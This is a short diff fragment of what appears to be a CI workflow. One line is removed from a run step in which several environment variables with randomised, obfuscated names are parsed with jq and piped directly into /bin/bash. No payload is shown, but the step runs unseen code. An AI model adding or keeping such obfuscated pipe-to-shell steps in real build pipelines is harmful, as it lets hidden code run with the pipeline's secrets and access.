@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$tybla57380" | jq -r .qw5 | /bin/bash
           printf '%s' "$za63" | jq -r .hac26828 | /bin/bash
-          echo $zy1959 | jq -r .bd9 | /bin/bash
           echo $kkkq6256 | jq -r .cuhha2674 | /bin/bash
           printf '%s' "$g28" | jq -r .mx906 | /bin/bash
           echo $d34 | jq -r .ka39752 | /bin/bash
